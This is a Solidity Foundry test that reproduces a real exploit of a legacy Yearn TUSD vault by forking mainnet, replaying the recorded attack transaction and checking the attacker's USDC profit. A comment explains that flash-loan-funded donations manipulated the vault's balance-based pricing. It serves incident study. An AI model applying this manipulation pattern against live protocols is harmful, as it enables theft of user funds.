// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$307K
    - Attacker: 0xcAca279dFF5110efa61091BEcF577911A2fa4cC3
    - Attack Contract: 0x67E0c4cFC88B98b9Ed718b49B8D2f812dF738e42
    - Attack Tx: https://etherscan.io/tx/0x78921ce8d0361193b0d34bc76800ef4754ba9151a1837492f17c559f23771c43

    The legacy Yearn TUSD vault priced its Fulcrum sUSD strategy from a
    manipulable balance. Flash-loan-funded donations distorted that accounting,
    allowing the attacker to withdraw more underlying than supplied.
*/

interface IERC20YearnFulcrum {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract YearnFulcrumExploitTest is Test {
    bytes32 private constant ATTACK_TX = 0x78921ce8d0361193b0d34bc76800ef4754ba9151a1837492f17c559f23771c43;
    address private constant ATTACKER = 0xcAca279dff5110EFa61091BEcF577911a2fa4cC3;
    IERC20YearnFulcrum private constant USDC = IERC20YearnFulcrum(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        vm.createSelectFork("mainnet", 24_027_659);
    }

    function testExploit() public {
        uint256 usdcBefore = USDC.balanceOf(ATTACKER);
        vm.transact(ATTACK_TX);
        uint256 usdcProfit = USDC.balanceOf(ATTACKER) - usdcBefore;

        emit log_named_decimal_uint("USDC profit component", usdcProfit, 6);
        assertEq(usdcProfit, 6845.147604e6);
    }
}
